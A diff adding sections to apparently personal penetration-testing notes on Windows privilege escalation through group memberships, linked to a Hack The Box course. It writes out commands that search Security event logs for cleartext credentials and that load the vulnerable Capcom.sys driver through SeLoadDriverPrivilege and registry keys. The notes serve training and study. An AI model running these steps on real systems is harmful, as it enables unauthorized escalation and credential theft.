@@ -147,5 +147,73 @@ PS> dnscmd /config /serverlevelplugindll <absolute_path_to_dll>
 ```
 
 You need to restart the DNS service. If you made changes to the groups of the current user, you need to log out and log back in.
+
+<br>
+
+#### Event Log Readers — Can Read Logs
+
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
+
+You may find cleartext credentials within the logs.
+
+```ps
+PS> wevtutil qe Security /rd:true /f:text | Select-String "/user"
+PS> wevtutil qe Security /rd:true /f:text /r:share_name /u:username /p:password | Select-String "/user"
+```
+
+You can also use `Get-WinEvent` but it requires special permissions.
 </div><div>
+
+#### Server Operators
+
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
+
+*-- Grants many privileges as [listed here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators) --*
+
+Members of the Server Operators group can administer domain controllers. They can start/stop/manage services, backup/restore files...
+
+Refer to [Windows services](services.md) notes or [Backup Operators](#backup-operators--access-any-file) notes.
+
+#### Print Operators
+
+*-- Grants the SeLoadDriverPrivilege among other privileges --*
+
+Members of the Print Operators can manage shares, delete printers, and before Windows 10 Version 1803, we would load a malicious driver using a user registry key. [Capcom](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) is a known vulnerable driver.
+
+We could use [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) <small>(0.1k ⭐, 2018 🪦)</small> to enable the SeLoadDriverPrivilege and configure load the [capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) driver.
+
+```ps
+PS> .\EoPLoadDriver.exe System\CurrentControlSet\Capcom .\Capcom.sys
+```
+
+We could do it manually by compiling [EnableSeLoadDriverPrivilege](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) <small>(1.0k ⭐, 2018 🪦)</small> and create registry keys pointint to [capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys):
+
+```ps
+PS> .\EnableSeLoadDriverPrivilege.exe
+<ok>
+PS> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Path\to\Capcom.sys"
+PS> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+```
+
+<details class="details-n">
+<summary>Compile EnableSeLoadDriverPrivilege.cpp on Windows</summary>
+
+Add the following headers:
+
+```cpp
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+<...>
+```
+
+You may use `cl` from Visual Studio or Windows SDK:
+
+```shell!
+PS> cl.exe /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+```
+</details>
 </div></div>
